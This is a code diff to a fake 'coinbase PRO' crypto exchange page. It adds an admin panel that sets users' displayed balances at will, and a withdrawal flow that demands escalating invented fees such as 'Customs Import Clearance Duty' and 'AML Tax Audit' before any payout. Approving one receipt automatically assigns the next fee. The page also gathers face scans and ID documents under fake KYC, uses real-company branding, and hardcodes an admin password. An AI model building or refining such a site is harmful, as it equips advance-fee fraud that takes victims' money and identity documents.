@@ -45,9 +45,7 @@
   <!-- TOP TICKER BAR -->
   <div class="bg-[#07090e] border-b border-cbBorder text-xs py-2 px-4 overflow-x-auto whitespace-nowrap">
     <div class="max-w-7xl mx-auto flex justify-between items-center gap-6">
-      <div class="flex items-center gap-6" id="cryptoTickerContainer">
-        <!-- Live Tickers Dynamic Insert -->
-      </div>
+      <div class="flex items-center gap-6" id="cryptoTickerContainer"></div>
       <div class="flex items-center gap-3">
         <span class="text-slate-400">Currency:</span>
         <select id="userCurrencySelect" onchange="changeCurrency(this.value)" class="bg-cbCardBg border border-cbBorder text-xs px-2 py-1 rounded text-slate-200 focus:outline-none">
@@ -64,14 +62,13 @@
   <!-- HEADER NAVIGATION -->
   <header class="bg-cbCardBg/90 backdrop-blur-md border-b border-cbBorder sticky top-0 z-40">
     <div class="max-w-7xl mx-auto px-4 sm:px-6 py-3.5 flex justify-between items-center">
-      <div class="flex items-center gap-3 cursor-pointer" onclick="switchNavTab('dashboard')">
+      <div class="flex items-center gap-3 cursor-pointer" onclick="switchMainTab('markets')">
         <div class="bg-cbBlue p-2 rounded-xl text-white font-black text-xl tracking-wider">
           <i class="fa-solid fa-cube"></i>
         </div>
         <span class="font-black text-xl tracking-tight text-white">coinbase <span class="text-cbBlue font-mono text-sm px-1.5 py-0.5 rounded bg-cbBlue/10 border border-cbBlue/30">PRO</span></span>
       </div>
 
-      <!-- User Info & Nav Links -->
       <div id="navRightSection" class="flex items-center gap-3 text-xs sm:text-sm font-semibold">
         <button onclick="openAuthModal('signin')" class="text-slate-300 hover:text-white px-3 py-1.5">Sign In</button>
         <button onclick="openAuthModal('signup')" class="bg-cbBlue hover:bg-cbBlueHover text-white px-4 py-2 rounded-lg transition font-bold shadow-lg shadow-cbBlue/20">Get Started</button>
@@ -83,7 +80,6 @@
   <!-- MAIN DASHBOARD CONTENT -->
   <main class="flex-grow max-w-7xl w-full mx-auto p-4 sm:p-6 space-y-6">
 
-    <!-- USER DASHBOARD TABS (HIDDEN UNTIL LOGIN) -->
     <div id="userDashContainer" class="space-y-6">
 
       <!-- TOP METRICS BANNER -->
@@ -98,8 +94,8 @@
               <span id="dispUserSubBal" class="text-xs text-slate-400 mt-1 block font-mono">≈ 0.00000000 BTC</span>
             </div>
             <div class="flex gap-2">
-              <span id="kycBadge" class="text-[10px] font-bold px-2.5 py-1 rounded-full bg-amber-500/10 text-amber-400 border border-amber-500/20 flex items-center gap-1">
-                <i class="fa-solid fa-clock"></i> KYC Pending
+              <span id="kycBadge" class="text-[10px] font-bold px-2.5 py-1 rounded-full bg-slate-800 text-slate-400 border border-cbBorder flex items-center gap-1 cursor-pointer" onclick="openKYCModal()">
+                <i class="fa-solid fa-lock"></i> KYC Unverified — Sign In First
               </span>
             </div>
           </div>
@@ -174,17 +170,14 @@
             <p class="text-xs text-slate-400">Lock your capital into audited institutional liquidity pools.</p>
           </div>
         </div>
-
-        <div id="investmentSlotsGrid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
-          <!-- Dynamic Investment Cards Populated via Admin Data -->
-        </div>
+        <div id="investmentSlotsGrid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4"></div>
       </div>
 
       <!-- TAB 3: TRANSACTION HISTORY -->
       <div id="tabContentHistory" class="hidden glass-card p-6 rounded-2xl space-y-4">
         <h3 class="font-bold text-sm text-white">Account Activity & Ledger</h3>
         <div id="txHistoryContainer" class="space-y-2 text-xs">
-          <!-- Dynamic TX Records -->
+          <p class="text-slate-400">No recent transactions recorded.</p>
         </div>
       </div>
 
@@ -192,7 +185,7 @@
 
   </main>
 
-  <!-- AUTH MODAL (SIGN IN / SIGN UP) -->
+  <!-- AUTH MODAL -->
   <div id="authModal" class="hidden fixed inset-0 bg-black/80 backdrop-blur-md z-50 flex items-center justify-center p-4">
     <div class="glass-card rounded-2xl max-w-md w-full p-6 space-y-4 relative text-xs">
       <button onclick="closeAuthModal()" class="absolute top-4 right-4 text-slate-400 hover:text-white text-base"><i class="fa-solid fa-xmark"></i></button>
@@ -235,7 +228,7 @@
     </div>
   </div>
 
-  <!-- SEQUENTIAL KYC MODAL (FACE LIVENESS -> ID UPLOAD) -->
+  <!-- SEQUENTIAL KYC MODAL -->
   <div id="kycModal" class="hidden fixed inset-0 bg-black/90 backdrop-blur-lg z-50 flex items-center justify-center p-4">
     <div class="glass-card rounded-2xl max-w-md w-full p-6 space-y-4 relative text-xs text-center">
       
@@ -250,7 +243,6 @@
           <p class="text-slate-400 mt-0.5">Follow the live instructions in the camera frame below.</p>
         </div>
 
-        <!-- CAMERA SIMULATION FRAME -->
         <div class="relative w-48 h-48 mx-auto bg-slate-900 rounded-full border-4 border-cbBlue overflow-hidden flex items-center justify-center">
           <i class="fa-solid fa-user text-6xl text-slate-700"></i>
           <div class="scan-line absolute left-0 right-0 h-1 bg-cbBlue/80 shadow-[0_0_15px_#0052ff]"></div>
@@ -263,7 +255,7 @@
         <button id="startLivenessBtn" onclick="runLivenessSimulation()" class="w-full bg-cbBlue hover:bg-cbBlueHover text-white font-bold py-3 rounded-xl transition">Start Facial Scan</button>
       </div>
 
-      <!-- STEP 2: ID DOCUMENT UPLOAD -->
+      <!-- STEP 2: ID UPLOAD -->
       <div id="kycStep2" class="hidden space-y-4">
         <div class="inline-block bg-emerald-500/10 text-emerald-400 p-3 rounded-full border border-emerald-500/30">
           <i class="fa-solid fa-id-card text-2xl"></i>
@@ -322,7 +314,6 @@
         </div>
 
         <div class="bg-white p-4 rounded-xl text-center flex flex-col items-center justify-center">
-          <!-- Dynamic QR Code -->
           <img id="recQrImage" src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh" class="w-36 h-36 rounded border" alt="QR Code">
         </div>
 
@@ -382,37 +373,76 @@
     </div>
   </div>
 
-  <!-- MULTI-STAGE WITHDRAWAL ACTION MODAL -->
+  <!-- WITHDRAWAL FORM & ACTION MODAL -->
   <div id="withdrawalModal" class="hidden fixed inset-0 bg-black/90 backdrop-blur-lg z-50 flex items-center justify-center p-4">
     <div class="glass-card rounded-2xl max-w-md w-full p-6 space-y-4 relative text-xs">
       <button onclick="closeWithdrawalModal()" class="absolute top-4 right-4 text-slate-400 hover:text-white text-base"><i class="fa-solid fa-xmark"></i></button>
 
-      <!-- ROLLING SPINNER VIEW -->
-      <div id="wdLoadingSpinner" class="text-center py-8 space-y-3">
-        <div class="inline-block w-12 h-12 border-4 border-cbBlue border-t-transparent rounded-full animate-spin"></div>
-        <h4 class="font-bold text-white text-sm">Initializing Secure Settlement Protocol...</h4>
-        <p class="text-slate-400 text-[11px]">Connecting to banking liquidity hub and checking compliance hold status...</p>
+      <!-- VIEW 1: WITHDRAWAL INPUT REQUEST FORM -->
+      <div id="wdInputFormBox" class="space-y-4">
+        <h3 class="text-base font-black text-white flex items-center gap-2"><i class="fa-solid fa-arrow-up-right text-emerald-400"></i> Initiate Crypto Withdrawal</h3>
+        <p class="text-slate-400">Enter your destination payout address and amount.</p>
+
+        <div class="space-y-3">
+          <div>
+            <label class="font-bold text-slate-300 block mb-1">Withdrawal Asset</label>
+            <select id="wdAssetSelect" class="w-full bg-cbDarkBg border border-cbBorder p-2.5 rounded-xl text-white outline-none font-bold">
+              <option value="BTC">Bitcoin (BTC)</option>
+              <option value="USDT">Tether USD (USDT TRC20)</option>
+              <option value="ETH">Ethereum (ETH)</option>
+            </select>
+          </div>
+
+          <div>
+            <label class="font-bold text-slate-300 block mb-1">Destination Wallet Address</label>
+            <input type="text" id="wdDestAddr" placeholder="Paste target wallet address" class="w-full bg-cbDarkBg border border-cbBorder p-2.5 rounded-xl text-white font-mono outline-none">
+          </div>
+
+          <div>
+            <label class="font-bold text-slate-300 block mb-1">Amount ($ USD)</label>
+            <input type="number" id="wdAmtInput" placeholder="Enter USD Amount" class="w-full bg-cbDarkBg border border-cbBorder p-2.5 rounded-xl text-white font-mono outline-none">
+          </div>
+
+          <button onclick="submitWithdrawalRequest()" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-3 rounded-xl transition shadow-lg shadow-emerald-600/20">Submit Withdrawal Request</button>
+        </div>
       </div>
 
-      <!-- STAGE ACTION VIEW -->
+      <!-- VIEW 2: ROLLING SPINNER -->
+      <div id="wdLoadingSpinner" class="hidden text-center py-8 space-y-3">
+        <div class="inline-block w-12 h-12 border-4 border-cbBlue border-t-transparent rounded-full animate-spin"></div>
+        <h4 class="font-bold text-white text-sm">Checking Withdrawal Clearing Requirements...</h4>
+        <p class="text-slate-400 text-[11px]">Connecting to banking liquidity hub and verifying clearance holds...</p>
+      </div>
+
+      <!-- VIEW 3: ACTION REQUIREMENT HOLD VIEW -->
       <div id="wdStageActionBox" class="hidden space-y-4">
         <div class="flex items-center justify-between border-b border-cbBorder pb-3">
-          <span class="text-[10px] font-bold uppercase tracking-widest text-cbBlue" id="wdStepBadge">Action Step 1 of 3</span>
-          <span class="text-xs font-mono font-bold text-amber-400">Status: Action Required</span>
+          <span class="text-[10px] font-bold uppercase tracking-widest text-cbBlue" id="wdStepBadge">Action Step Required</span>
+          <span class="text-xs font-mono font-bold text-amber-400">Status: Hold Pending</span>
         </div>
 
         <div class="bg-cbDarkBg p-4 rounded-xl border border-cbBorder space-y-2">
           <h4 id="wdActionTitle" class="font-bold text-white text-sm">Customs Import Clearance Duty</h4>
-          <p id="wdActionDesc" class="text-slate-400 leading-relaxed text-[11px]">A mandatory clearance tariff fee of $150.00 USD must be settled to release your payout hold.</p>
+          <p class="text-slate-400 leading-relaxed text-[11px]">A mandatory compliance fee must be settled to release your withdrawal payout.</p>
+          <div class="bg-cbCardBg p-2.5 rounded-lg border border-cbBorder flex justify-between items-center mt-2">
+            <span class="text-slate-400 font-bold">Required Fee:</span>
+            <span id="wdActionFeeDisp" class="font-mono font-black text-amber-400 text-sm">$150.00 USD</span>
+          </div>
+        </div>
+
+        <!-- PAYMENT METHOD INSTRUCTIONS -->
+        <div class="bg-cbDarkBg p-3 rounded-xl border border-cbBorder space-y-2">
+          <span class="font-bold text-white uppercase text-[10px] block">Payment Destination Channels</span>
+          <div id="wdPayChannelDetails" class="space-y-1 font-mono text-[11px] text-slate-300"></div>
         </div>
 
         <!-- SCREENSHOT PROOF SUBMISSION FORM -->
         <div class="space-y-2 border-t border-cbBorder pt-3">
-          <span class="font-bold text-white uppercase text-[10px] block">Submit Step Requirement Proof</span>
-          <input type="text" id="wdProofNotes" placeholder="Transaction Ref / Payment Hash / Notes" class="w-full bg-cbDarkBg border border-cbBorder p-2.5 rounded-xl text-white outline-none">
+          <span class="font-bold text-white uppercase text-[10px] block">Submit Requirement Proof / Receipt</span>
+          <input type="text" id="wdProofNotes" placeholder="Transaction Hash / Payment Ref Notes" class="w-full bg-cbDarkBg border border-cbBorder p-2.5 rounded-xl text-white outline-none">
           
           <div>
-            <label class="font-bold text-slate-300 block mb-1">Upload Receipt / Payment Screenshot</label>
+            <label class="font-bold text-slate-300 block mb-1">Upload Receipt Screenshot</label>
             <input type="file" id="wdScreenshotInput" accept="image/*" onchange="previewWdScreenshot(event)" class="w-full text-slate-400 file:mr-2 file:py-1.5 file:px-3 file:rounded-lg file:border-0 file:text-xs file:font-semibold file:bg-cbBlue file:text-white">
           </div>
 
@@ -450,7 +480,7 @@
         <div class="flex justify-between items-center border-b border-cbBorder pb-4">
           <div>
             <h2 class="text-lg font-black text-white"><i class="fa-solid fa-sliders text-cbBlue"></i> System Administration Panel</h2>
-            <p class="text-slate-400">Manage KYC, user balances, withdrawal action stages, and investment slots.</p>
+            <p class="text-slate-400">Manage KYC, edit balances, program action titles/fees, and investment slots.</p>
           </div>
           <button onclick="adminLogout()" class="bg-red-500/10 text-red-400 border border-red-500/20 font-bold px-3 py-1.5 rounded-lg hover:bg-red-500/20">Logout</button>
         </div>
@@ -459,29 +489,36 @@
           
           <!-- 1. USER BALANCE & WITHDRAWAL STAGE CONTROL -->
           <div class="bg-cbDarkBg p-4 rounded-xl border border-cbBorder space-y-3">
-            <h3 class="font-bold text-white flex items-center gap-2"><i class="fa-solid fa-user-gear text-cbBlue"></i> User Balance & Withdrawal Stage Control</h3>
+            <h3 class="font-bold text-white flex items-center gap-2"><i class="fa-solid fa-user-gear text-cbBlue"></i> User Balance & Withdrawal Control</h3>
             
             <select id="admUserSelect" onchange="loadAdmUserData()" class="w-full bg-cbCardBg border border-cbBorder p-2 rounded-xl text-white">
               <option value="">Select Target Registered User...</option>
             </select>
 
-            <div class="space-y-2">
-              <label class="font-bold text-slate-400 block text-[10px] uppercase">Edit Account Balance ($ USD)</label>
+            <!-- EDIT BALANCE -->
+            <div class="space-y-2 bg-cbCardBg p-3 rounded-xl border border-cbBorder">
+              <label class="font-bold text-white block text-[10px] uppercase">Edit User Balance ($ USD)</label>
               <div class="flex gap-2">
-                <input type="number" id="admUserBalInput" placeholder="Enter USD Balance" class="flex-1 bg-cbCardBg border border-cbBorder p-2 rounded-xl text-white font-mono">
-                <button onclick="saveAdmUserBal()" class="bg-cbBlue hover:bg-cbBlueHover text-white font-bold px-4 rounded-xl">Save</button>
+                <input type="number" id="admUserBalInput" placeholder="USD Balance" class="flex-1 bg-cbDarkBg border border-cbBorder p-2 rounded-xl text-white font-mono">
+                <button onclick="saveAdmUserBal()" class="bg-cbBlue hover:bg-cbBlueHover text-white font-bold px-4 rounded-xl">Save Balance</button>
               </div>
             </div>
 
-            <div class="space-y-2 border-t border-cbBorder pt-3">
-              <label class="font-bold text-slate-400 block text-[10px] uppercase">Withdrawal Action Stage Program</label>
-              <select id="admWdStageSelect" class="w-full bg-cbCardBg border border-cbBorder p-2 rounded-xl text-white">
-                <option value="1">Stage 1: Customs Import Clearance Tariff ($150)</option>
-                <option value="2">Stage 2: Anti-Money Laundering (AML) Tax Audit ($300)</option>
-                <option value="3">Stage 3: Blockchain Liquidity Gas Network Fee ($100)</option>
-                <option value="4">Stage 4: Complete / Unlocked Payout</option>
-              </select>
-              <button onclick="saveAdmUserStage()" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-2 rounded-xl">Set Active Stage & Advance User</button>
+            <!-- EDIT CUSTOM WITHDRAWAL ACTION -->
+            <div class="space-y-2 bg-cbCardBg p-3 rounded-xl border border-cbBorder">
+              <label class="font-bold text-white block text-[10px] uppercase">Set Withdrawal Step Action & Amount</label>
+              
+              <div>
+                <span class="text-[10px] text-slate-400">Action Title Name:</span>
+                <input type="text" id="admWdTitleInput" placeholder="e.g. Customs Import Clearance Duty" class="w-full bg-cbDarkBg border border-cbBorder p-2 rounded-xl text-white text-xs mt-1">
+              </div>
+
+              <div>
+                <span class="text-[10px] text-slate-400">Required Amount ($ USD):</span>
+                <input type="number" id="admWdFeeInput" placeholder="e.g. 150" class="w-full bg-cbDarkBg border border-cbBorder p-2 rounded-xl text-white font-mono text-xs mt-1">
+              </div>
+
+              <button onclick="saveAdmUserStageAction()" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-bold py-2 rounded-xl mt-1">Update User Action Requirement</button>
             </div>
           </div>
 
@@ -524,7 +561,6 @@
 
   <!-- APPLICATION LOGIC SCRIPT -->
   <script>
-    // GLOBAL STATE
     const ADMIN_USER = "Admin";
     const ADMIN_PASS = "Femifresh12345";
 
@@ -545,10 +581,13 @@
         country: "United States",
         pass: "123456",
         balanceUSD: 2500,
-        kycStatus: "approved", // unverified, pending, approved
+        kycStatus: "approved",
         kycDocType: "National Passport",
         kycDocImg: null,
-        wdStage: 1, // 1, 2, 3, 4 (completed)
+        wdStageIndex: 0,
+        wdActionTitle: "Customs Import Clearance Duty",
+        wdActionFeeUSD: 150,
+        wdHasActiveRequest: false,
         wdProofSubmitted: false,
         wdProofNotes: "",
         wdProofScreenshot: null,
@@ -566,7 +605,6 @@
     let currentUserEmail = localStorage.getItem('cb_pro_active_user') || null;
     let activeWdScreenshot = null;
 
-    // INITIALIZATION
     window.addEventListener('load', () => {
       renderCryptoTickers();
       initChart();
@@ -583,7 +621,6 @@
       if (currentUserEmail) updateUserDashboardUI();
     }
 
-    // TICKERS & CURRENCY
     function renderCryptoTickers() {
       const container = document.getElementById('cryptoTickerContainer');
       const coins = [
@@ -606,7 +643,6 @@
       updateUserDashboardUI();
     }
 
-    // DASHBOARD & TABS
     function switchMainTab(tabName) {
       ['markets', 'invest', 'history'].forEach(t => {
         const btn = document.getElementById('tabBtn' + t.charAt(0).toUpperCase() + t.slice(1));
@@ -626,17 +662,21 @@
     }
 
     function updateUserDashboardUI() {
-      if (!currentUserEmail || !users[currentUserEmail]) return;
+      if (!currentUserEmail || !users[currentUserEmail]) {
+        document.getElementById('kycBadge').className = "text-[10px] font-bold px-2.5 py-1 rounded-full bg-slate-800 text-slate-400 border border-cbBorder flex items-center gap-1 cursor-pointer";
+        document.getElementById('kycBadge').innerHTML = '<i class="fa-solid fa-lock"></i> KYC Unverified — Sign In First';
+        document.getElementById('kycBadge').onclick = () => openAuthModal('signin');
+        return;
+      }
+
       const u = users[currentUserEmail];
 
-      // Update Nav
       document.getElementById('navRightSection').innerHTML = `
         <span class="text-slate-300 font-bold"><i class="fa-solid fa-user text-cbBlue"></i> ${u.name}</span>
         <button onclick="userLogout()" class="border border-cbBorder hover:border-slate-500 text-slate-400 px-3 py-1 rounded-lg text-xs">Logout</button>
         <button onclick="openAdminModal()" class="border border-cbBorder hover:border-slate-500 text-slate-400 px-3 py-1 rounded-lg text-xs">Admin 🔒</button>
       `;
 
-      // Update Balances with Selected Currency
       const rate = currencyRates[activeCurrency] || 1;
       const sym = currencySymbols[activeCurrency] || "$";
       const convertedBal = (u.balanceUSD * rate).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
@@ -644,14 +684,15 @@
       document.getElementById('dispUserBalance').innerText = `${sym}${convertedBal}`;
       document.getElementById('dispUserSubBal').innerText = `≈ ${(u.balanceUSD / 64230.5).toFixed(6)} BTC`;
 
-      // KYC Badge
       const badge = document.getElementById('kycBadge');
       if (u.kycStatus === 'approved') {
         badge.className = "text-[10px] font-bold px-2.5 py-1 rounded-full bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 flex items-center gap-1";
         badge.innerHTML = '<i class="fa-solid fa-circle-check"></i> KYC Verified';
+        badge.onclick = null;
       } else if (u.kycStatus === 'pending') {
         badge.className = "text-[10px] font-bold px-2.5 py-1 rounded-full bg-amber-500/10 text-amber-400 border border-amber-500/20 flex items-center gap-1";
         badge.innerHTML = '<i class="fa-solid fa-clock"></i> Verification Pending Review';
+        badge.onclick = null;
       } else {
         badge.className = "text-[10px] font-bold px-2.5 py-1 rounded-full bg-red-500/10 text-red-400 border border-red-500/20 flex items-center gap-1 cursor-pointer";
         badge.innerHTML = '<i class="fa-solid fa-triangle-exclamation"></i> Complete KYC Verification';
@@ -661,7 +702,6 @@
       renderInvestmentSlots();
     }
 
-    // INVESTMENT SLOTS RENDER
     function renderInvestmentSlots() {
       const container = document.getElementById('investmentSlotsGrid');
       if (!container) return;
@@ -715,7 +755,6 @@
       alert('✅ Investment Slot Activated! Yield accrual initiated.');
     }
 
-    // AUTHENTICATION
     function openAuthModal(mode) {
       document.getElementById('authModal').classList.remove('hidden');
       if (mode === 'signin') {
@@ -753,7 +792,10 @@
           pass: pass,
           balanceUSD: 0,
           kycStatus: "unverified",
-          wdStage: 1,
+          wdStageIndex: 0,
+          wdActionTitle: "Customs Import Clearance Duty",
+          wdActionFeeUSD: 150,
+          wdHasActiveRequest: false,
           wallets: {
             BTC: "bc1q" + Math.random().toString(36).substring(2, 12),
             ETH: "0x" + Math.random().toString(36).substring(2, 12),
@@ -765,7 +807,7 @@
         localStorage.setItem('cb_pro_active_user', email);
         saveData();
         closeAuthModal();
-        openKYCModal(); // Trigger post-registration KYC
+        openKYCModal();
       } else {
         if (users[email] && users[email].pass === pass) {
           currentUserEmail = email;
@@ -784,8 +826,8 @@
       location.reload();
     }
 
-    // SEQUENTIAL KYC (STEP 1 LIVENESS -> STEP 2 ID UPLOAD)
     function openKYCModal() {
+      if (!currentUserEmail) return openAuthModal('signin');
       document.getElementById('kycModal').classList.remove('hidden');
       document.getElementById('kycStep1').classList.remove('hidden');
       document.getElementById('kycStep2').classList.add('hidden');
@@ -840,7 +882,6 @@
       alert('✅ KYC Verification Submitted! Your documents are queued for Admin approval.');
     }
 
-    // RECEIVE ASSET MODAL
     function openReceiveModal() {
       if (!currentUserEmail) return openAuthModal('signin');
       document.getElementById('receiveModal').classList.remove('hidden');
@@ -865,7 +906,6 @@
       alert('Wallet address copied to clipboard!');
     }
 
-    // DEPOSIT MODAL
     function openDepositModal() {
       if (!currentUserEmail) return openAuthModal('signin');
       document.getElementById('depositModal').classList.remove('hidden');
@@ -887,7 +927,6 @@
       closeDepositModal();
     }
 
-    // MULTI-STAGE WITHDRAWAL PROCESS
     function initiateWithdrawalProcess() {
       if (!currentUserEmail) return openAuthModal('signin');
       const u = users[currentUserEmail];
@@ -899,8 +938,33 @@
       }
 
       document.getElementById('withdrawalModal').classList.remove('hidden');
+      
+      if (u.wdHasActiveRequest) {
+        document.getElementById('wdInputFormBox').classList.add('hidden');
+        document.getElementById('wdLoadingSpinner').classList.add('hidden');
+        document.getElementById('wdStageActionBox').classList.remove('hidden');
+        renderWdStageAction(u);
+      } else {
+        document.getElementById('wdInputFormBox').classList.remove('hidden');
+        document.getElementById('wdLoadingSpinner').classList.add('hidden');
+        document.getElementById('wdStageActionBox').classList.add('hidden');
+      }
+    }
+
+    function submitWithdrawalRequest() {
+      const addr = document.getElementById('wdDestAddr').value.trim();
+      const amt = parseFloat(document.getElementById('wdAmtInput').value) || 0;
+
+      if (!addr || amt <= 0) return alert('Enter valid destination address and amount.');
+      const u = users[currentUserEmail];
+
+      if (amt > u.balanceUSD) return alert('❌ Insufficient balance for this withdrawal amount.');
+
+      u.wdHasActiveRequest = true;
+      saveData();
+
+      document.getElementById('wdInputFormBox').classList.add('hidden');
       document.getElementById('wdLoadingSpinner').classList.remove('hidden');
-      document.getElementById('wdStageActionBox').classList.add('hidden');
 
       setTimeout(() => {
         document.getElementById('wdLoadingSpinner').classList.add('hidden');
@@ -914,28 +978,23 @@
     }
 
     function renderWdStageAction(u) {
-      const stage = u.wdStage || 1;
-      const stepBadge = document.getElementById('wdStepBadge');
-      const title = document.getElementById('wdActionTitle');
-      const desc = document.getElementById('wdActionDesc');
+      const rate = currencyRates[activeCurrency] || 1;
+      const sym = currencySymbols[activeCurrency] || "$";
 
-      if (stage === 1) {
-        stepBadge.innerText = "Action Step 1 of 3";
-        title.innerText = "Customs Import Clearance Duty";
-        desc.innerText = "A mandatory clearance tariff fee of $150.00 USD must be settled to release your payout hold.";
-      } else if (stage === 2) {
-        stepBadge.innerText = "Action Step 2 of 3";
-        title.innerText = "Anti-Money Laundering (AML) Tax Audit";
-        desc.innerText = "A required compliance tax audit fee of $300.00 USD is pending for cross-border clearance.";
-      } else if (stage === 3) {
-        stepBadge.innerText = "Action Step 3 of 3";
-        title.innerText = "Blockchain Liquidity Gas Network Fee";
-        desc.innerText = "A network gas settlement fee of $100.00 USD is required to broadcast your payout transaction.";
-      } else {
-        stepBadge.innerText = "Payout Status: Cleared";
-        title.innerText = "Withdrawal Fully Unlocked";
-        desc.innerText = "Your account has cleared all compliance stages. Funds will be dispatched automatically.";
-      }
+      document.getElementById('wdActionTitle').innerText = u.wdActionTitle || "Customs Import Clearance Duty";
+      const fee = ((u.wdActionFeeUSD || 150) * rate).toLocaleString(undefined, { minimumFractionDigits: 2 });
+      document.getElementById('wdActionFeeDisp').innerText = `${sym}${fee} (${u.wdActionFeeUSD || 150} USD)`;
+
+      document.getElementById('wdPayChannelDetails').innerHTML = `
+        <div class="flex justify-between items-center py-1 border-b border-cbBorder/50">
+          <span>BTC Target:</span>
+          <span class="font-bold text-white text-[10px]">${u.wallets.BTC}</span>
+        </div>
+        <div class="flex justify-between items-center py-1">
+          <span>USDT (TRC20):</span>
+          <span class="font-bold text-white text-[10px]">${u.wallets.USDT}</span>
+        </div>
+      `;
     }
 
     function previewWdScreenshot(e) {
@@ -959,10 +1018,9 @@
       u.wdProofScreenshot = activeWdScreenshot;
       saveData();
       closeWithdrawalModal();
-      alert('✅ Step proof submitted! Admin will verify and unlock your next stage.');
+      alert('✅ Action requirement proof submitted! Admin will verify and clear your hold.');
     }
 
-    // ADMIN MASTER CONTROLS
     function openAdminModal() {
       document.getElementById('adminModal').classList.remove('hidden');
     }
@@ -1003,7 +1061,8 @@
       if (!email || !users[email]) return;
       const u = users[email];
       document.getElementById('admUserBalInput').value = u.balanceUSD;
-      document.getElementById('admWdStageSelect').value = u.wdStage || 1;
+      document.getElementById('admWdTitleInput').value = u.wdActionTitle || "Customs Import Clearance Duty";
+      document.getElementById('admWdFeeInput').value = u.wdActionFeeUSD || 150;
     }
 
     function saveAdmUserBal() {
@@ -1012,17 +1071,20 @@
       if (!email || !users[email]) return alert('Select user.');
       users[email].balanceUSD = bal;
       saveData();
-      alert(`✅ Updated balance for ${email} to $${bal} USD.`);
+      alert(`✅ Updated USD balance for ${email} to $${bal}.`);
     }
 
-    function saveAdmUserStage() {
+    function saveAdmUserStageAction() {
       const email = document.getElementById('admUserSelect').value;
-      const stage = parseInt(document.getElementById('admWdStageSelect').value) || 1;
+      const title = document.getElementById('admWdTitleInput').value.trim();
+      const fee = parseFloat(document.getElementById('admWdFeeInput').value) || 0;
+
       if (!email || !users[email]) return alert('Select user.');
-      users[email].wdStage = stage;
+      users[email].wdActionTitle = title;
+      users[email].wdActionFeeUSD = fee;
       users[email].wdProofSubmitted = false;
       saveData();
-      alert(`✅ Advanced ${email} to Withdrawal Stage ${stage}.`);
+      alert(`✅ Saved withdrawal requirement for ${email}: ${title} ($${fee} USD).`);
     }
 
     function addInvestmentSlot() {
@@ -1045,7 +1107,6 @@
     }
 
     function renderAdmQueues() {
-      // KYC Queue
       const kycContainer = document.getElementById('admKycQueue');
       kycContainer.innerHTML = '';
       let pendingKyc = false;
@@ -1073,7 +1134,6 @@
       });
       if (!pendingKyc) kycContainer.innerHTML = '<p class="text-slate-500">No KYC verification requests pending.</p>';
 
-      // Withdrawal Screenshot Queue
       const wdContainer = document.getElementById('admWdQueue');
       wdContainer.innerHTML = '';
       let pendingWd = false;
@@ -1087,10 +1147,10 @@
               <div class="flex justify-between items-start text-xs">
                 <div>
                   <strong class="text-white">${u.name}</strong> (${e})
-                  <p class="text-amber-400 font-bold">Submitted for Stage ${u.wdStage}</p>
+                  <p class="text-amber-400 font-bold">${u.wdActionTitle} ($${u.wdActionFeeUSD})</p>
                   <p class="text-slate-400">Notes: ${u.wdProofNotes || 'None'}</p>
                 </div>
-                <button onclick="approveWdStage('${e}')" class="bg-emerald-600 text-white font-bold px-3 py-1 rounded-lg">Approve Step & Advance</button>
+                <button onclick="approveWdStage('${e}')" class="bg-emerald-600 text-white font-bold px-3 py-1 rounded-lg">Approve Proof & Advance Next Step</button>
               </div>
               ${u.wdProofScreenshot ? `<img src="${u.wdProofScreenshot}" class="max-h-36 rounded border border-cbBorder mt-2">` : ''}
             </div>
@@ -1116,11 +1176,22 @@
 
     function approveWdStage(email) {
       const u = users[email];
-      u.wdStage = (u.wdStage || 1) + 1;
       u.wdProofSubmitted = false;
+      u.wdStageIndex = (u.wdStageIndex || 0) + 1;
+
+      const defaultSequentialStages = [
+        { title: "Anti-Money Laundering (AML) Tax Audit", fee: 300 },
+        { title: "Blockchain Liquidity Gas Network Fee", fee: 100 },
+        { title: "Institutional Settlement Hold Clearance", fee: 250 }
+      ];
+
+      const nextStage = defaultSequentialStages[u.wdStageIndex - 1] || { title: "Final Compliance Check", fee: 50 };
+      u.wdActionTitle = nextStage.title;
+      u.wdActionFeeUSD = nextStage.fee;
+
       saveData();
       renderAdmQueues();
-      alert(`Approved step for ${email}. User advanced to Stage ${u.wdStage}.`);
+      alert(`✅ Proof approved for ${email}! Next action automatically assigned: "${u.wdActionTitle}" ($${u.wdActionFeeUSD} USD).`);
     }
 
     function initChart() {
